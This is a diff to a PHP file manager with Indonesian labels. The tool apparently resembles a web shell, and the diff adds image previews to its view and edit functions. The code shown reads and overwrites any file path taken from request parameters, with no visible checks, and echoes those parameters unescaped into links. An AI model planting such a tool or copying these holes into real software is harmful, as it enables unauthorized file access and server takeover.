@@ -456,16 +456,28 @@ function buatFile($dir, $imgfile) {
 }
 function view($dir, $file, $nfile, $imgfile) {
     echo '[ <a class="active" href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]
-    <h5>'.$imgfile.' Lihat File : '.$nfile.'</h5>
-    <textarea rows="13" class="form-control" disabled="">'.htmlspecialchars(@file_get_contents($file)).'</textarea><br/>';
+    <h5>'.$imgfile.' Lihat File : '.$nfile.'</h5>';
+    $is_image = @getimagesize($file);
+    if (is_array($is_image)) {
+        $source = base64_encode(file_get_contents($file));
+        echo '<p>Type: '.$is_image['mime'].' | Size: '.$is_image['0'].' x '.$is_image['1']."</p>
+        <img class='img-fluid' src='data:".$is_image['mime'].';base64,'.$source."' alt='$nfile'>";
+    } else {
+        echo '<textarea rows="13" class="form-control" disabled="">'.htmlspecialchars(@file_get_contents($file)).'</textarea><br/>';
+    }
 }
 function editFile($dir, $file, $nfile, $imgfile) {
     echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
+    $is_image = @getimagesize($file);
     echo "<form method='POST'>
-        <h5>$imgfile Edit File : $nfile</h5>
-        <textarea rows='13' class='form-control' name='isi'>".htmlspecialchars(@file_get_contents($file))."</textarea><br/>
-            <button type='sumbit' class='btn btn-info btn-block' name='edit_file'>Update</button>
-    </form>";
+        <h5>$imgfile Edit File : $nfile</h5>";
+        if (is_array($is_image)) {
+            echo '<h5>Tidak dapat mengedit gambar</h5>';
+        } else {
+            echo "<textarea rows='13' class='form-control' name='isi'>".htmlspecialchars(@file_get_contents($file))."</textarea><br/>
+            <button type='sumbit' class='btn btn-info btn-block' name='edit_file'>Update</button>";
+        }
+    echo '</form>';
     if (isset($_POST['edit_file'])) {
         $updt = fopen("$file", 'w');
         $hasil = fwrite($updt, $_POST['isi']);
